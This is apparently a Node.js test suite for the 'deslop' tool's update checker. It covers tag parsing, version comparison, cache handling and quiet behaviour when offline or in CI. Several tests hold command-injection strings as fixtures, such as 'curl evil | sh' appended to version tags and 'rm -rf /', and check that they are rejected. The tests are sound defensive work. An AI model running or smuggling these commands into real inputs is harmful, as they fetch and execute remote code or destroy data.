import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";
import { isNewer, latestVersion, notice, parseTag } from "../skills/deslop/scripts/update_check.mjs";

const repo = join(dirname(fileURLToPath(import.meta.url)), "..");
const script = join(repo, "skills/deslop/scripts/update_check.mjs");
const current = readFileSync(join(repo, "skills/deslop/VERSION"), "utf8").trim();
const SAFE_LINE = /^deslop \d+\.\d+\.\d+ is available \(you have \d+\.\d+\.\d+\)\. Update: npx -y github:cdrcthv\/deslop#v\d+\.\d+\.\d+ update$/;

function sandbox(run) {
  const home = mkdtempSync(join(tmpdir(), "deslop-check-"));
  const cacheFile = join(home, ".cache/deslop/latest.json");
  const seed = (latest, ageMs = 0) => {
    mkdirSync(dirname(cacheFile), { recursive: true });
    writeFileSync(cacheFile, JSON.stringify({ checkedAt: Date.now() - ageMs, latest }));
  };
  const check = (env = {}, ...args) =>
    spawnSync(process.execPath, [script, ...args], {
      encoding: "utf8",
      env: { ...process.env, CI: "", DESLOP_NO_UPDATE_CHECK: "", DESLOP_RELEASE_URL: "https://127.0.0.1:1/", HOME: home, USERPROFILE: home, ...env },
    });
  try {
    run({ cacheFile, seed, check });
  } finally {
    rmSync(home, { recursive: true, force: true });
  }
}

test("only strict vX.Y.Z tags are accepted", () => {
  assert.equal(parseTag("v1.2.3"), "1.2.3");
  for (const bad of ["1.2.3", "v1.2", "v1.2.3-rc1", "v1.2.3 && curl evil | sh", "v1.2.3\nrm -rf /", "", null, undefined, 5]) {
    assert.equal(parseTag(bad), null, String(bad));
  }
});

test("compares versions numerically", () => {
  assert.ok(isNewer("1.10.0", "1.9.9"));
  assert.ok(isNewer("2.0.0", "1.99.99"));
  assert.ok(!isNewer("1.0.2", "1.0.2"));
  assert.ok(!isNewer("1.0.1", "1.0.2"));
});

test("the notice is pinned to the tag; plugin installs are sent to the plugin manager", () => {
  assert.match(notice("1.2.3", "1.0.0", "/home/u/.claude/skills/deslop/scripts"), SAFE_LINE);
  assert.match(notice("1.2.3", "1.0.0", "C:\\Users\\u\\.claude\\plugins\\cache\\deslop\\scripts"), /\/plugin$/);
});

test("prints one safe line when the cache knows a newer version", () => {
  sandbox(({ seed, check }) => {
    seed("99.0.0");
    const result = check();
    assert.equal(result.status, 0, result.stderr);
    assert.match(result.stdout.trim(), SAFE_LINE);
    assert.equal(result.stderr, "");
  });
});

test("silent when up to date, opted out, or in CI", () => {
  sandbox(({ seed, check }) => {
    seed(current);
    assert.equal(check().stdout, "");
    seed("99.0.0");
    assert.equal(check({ DESLOP_NO_UPDATE_CHECK: "1" }).stdout, "");
    assert.equal(check({ CI: "true" }).stdout, "");
  });
});

test("a poisoned cache never reaches the output", () => {
  sandbox(({ seed, check }) => {
    seed("99.0.0 && curl evil | sh");
    const result = check();
    assert.equal(result.status, 0);
    assert.equal(result.stdout, "");
  });
});

test("offline: exits 0 fast and silently, and does not retry for an hour", () => {
  sandbox(({ cacheFile, check }) => {
    const start = Date.now();
    const result = check();
    assert.equal(result.status, 0);
    assert.equal(result.stdout + result.stderr, "");
    assert.ok(Date.now() - start < 3000);
    const cached = JSON.parse(readFileSync(cacheFile, "utf8"));
    assert.ok(Date.now() - cached.checkedAt > 22 * 3600 * 1000, "retry soon, not in 24h");
  });
});

test("--now answers even when up to date or offline", () => {
  sandbox(({ seed, check }) => {
    assert.match(check({}, "--now").stdout, /Could not check/);
    seed(current);
    assert.match(check({ CI: "true" }, "--now").stdout, /^deslop .* is up to date\.|Could not check/);
  });
});

test("a malicious release name from the network is dropped and not cached", async () => {
  const dir = mkdtempSync(join(tmpdir(), "deslop-fetch-"));
  try {
    const cacheFile = join(dir, "latest.json");
    const fetchLatest = async () => parseTag("v1.0.0 && curl evil | sh");
    assert.equal(await latestVersion({ cacheFile, now: Date.now(), fetchLatest, force: false }), null);
    assert.equal(JSON.parse(readFileSync(cacheFile, "utf8")).latest, null);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("a fresh cache skips the network", async () => {
  const dir = mkdtempSync(join(tmpdir(), "deslop-fetch-"));
  try {
    const cacheFile = join(dir, "latest.json");
    writeFileSync(cacheFile, JSON.stringify({ checkedAt: Date.now(), latest: "1.2.3" }));
    const fetchLatest = async () => assert.fail("must not fetch");
    assert.equal(await latestVersion({ cacheFile, now: Date.now(), fetchLatest, force: false }), "1.2.3");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});
